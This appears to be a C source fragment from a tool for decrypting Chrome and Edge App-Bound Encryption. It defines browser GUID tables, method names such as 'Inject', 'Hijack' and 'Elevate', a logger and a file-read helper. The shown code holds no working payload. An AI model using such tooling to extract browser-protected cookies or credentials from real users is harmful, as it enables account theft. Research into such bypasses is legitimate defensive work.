#include "AbeDecrypt.h"

/*** browsers & methods ***/

const ABE_BROWSER AbeBrowsers[2] = {
    { L"Microsoft\\Edge",  L"Microsoft Edgekey1",
      {0x1FCBE96C,0x1697,0x43AF,{0x91,0x40,0x28,0x97,0xC7,0xC6,0x97,0x67}},
      {0xC9C2B807,0x7731,0x4F34,{0x81,0xB7,0x44,0xFF,0x77,0x79,0x52,0x2B}}, 8 },
    { L"Google\\Chrome",   L"Google Chromekey1",
      {0x708860E0,0xF641,0x4611,{0x88,0x95,0x7D,0x86,0x7D,0xD3,0x67,0x5B}},
      {0x1BF5208B,0x295F,0x4992,{0xB5,0xF4,0x3A,0x9B,0xB6,0x49,0x48,0x38}}, 5 },
};

const PCWSTR AbeMethodNames[MethodMax] = { L"Drop", L"Inject", L"Hijack", L"Elevate" };

const ABE_BROWSER*
AbeFindBrowserEntry(
    _In_z_ PCWSTR Vendor)
{
    ULONG i;

    for (i = 0; i < ARRAYSIZE(AbeBrowsers); i++)
    {
        if (Str_IEqualW(AbeBrowsers[i].Vendor, Vendor)) return &AbeBrowsers[i];
    }
    return NULL;
}

/*** log ***/

WCHAR g_Log[4096];

VOID
AbeLog(
    _In_z_ _Printf_format_string_ PCWSTR Format,
    ...)
{
    va_list Args;
    ULONG Length;

    va_start(Args, Format);
    Length = (ULONG)wcslen(g_Log);
    if (Length < ARRAYSIZE(g_Log) - 1)
    {
        Str_VPrintfExW(g_Log + Length, ARRAYSIZE(g_Log) - Length, Format, Args);
    }
    va_end(Args);
}

/*** helpers ***/

NTSTATUS
AbeReadWholeFile(
    _In_ PCWSTR Path,
    _Out_writes_bytes_(BufferSize) PVOID Buffer,
    _In_ ULONG BufferSize,
    _Out_opt_ PULONG Size)
{
    NTSTATUS Status;
    HANDLE File;
    ULONG BytesRead;

    Status = IO_OpenWin32File(&File,
                              Path,
                              NULL,
                              FILE_READ_DATA | SYNCHRONIZE,
                              FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE);
    if (!NT_SUCCESS(Status))
    {
        return Status;
    }
    Status = IO_ReadFile(File, NULL, Buffer, BufferSize, &BytesRead);
    NtClose(File);
    if (NT_SUCCESS(Status) && Size != NULL)
    {
        *Size = BytesRead;
    }
    return Status;
}
